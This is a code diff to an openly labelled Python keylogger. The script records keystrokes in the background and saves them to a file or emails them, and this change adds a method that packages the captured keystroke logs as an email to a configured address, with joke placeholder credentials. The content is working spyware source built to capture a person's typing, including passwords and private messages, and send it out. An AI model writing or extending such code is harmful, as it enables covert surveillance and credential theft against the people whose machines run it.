@@ -1,5 +1,5 @@
 # listen to keystrokes in the background
-# whenever a key is pressed, add it to global string variable
+# whenever a key is pressed and released, add it to global string variable
 # every X number of minutes, write this string to local file or email
 
 # look into 'keyloggers' module
@@ -13,8 +13,9 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_INTERVAL = 120 # number of seconds to send the string
-EMAIL_ADDRESS = "dwight.schrute@dundermifflin.com"
-EMAIL_PASSWORD = "bearsbeetsbattlestargalactica"
+
+EMAIL_ADDRESS = "Dwight.Schrute@DunderMifflin.com"
+EMAIL_PASSWORD = "BearsBeetsBattlestarGalactica"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -65,3 +66,21 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+
+
+    # make MIMEMultipart from text, creates HTML and text versions to send as email
+    # you're basically sending yourself an email with the keylogs
+    def prepare_mail(self, message):
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS         # send it to yourself
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogs"
+
+        html = f"<p>{message}</p>"          # body of the email
+        mime_text = MIMEText(message, "plain")
+        mime_html = MIMEText(html, "html")
+        msg.attach(mime_text)
+        msg.attach(mime_html)
+
+        # after creating the email, return it as a string
+        return msg.as_string()
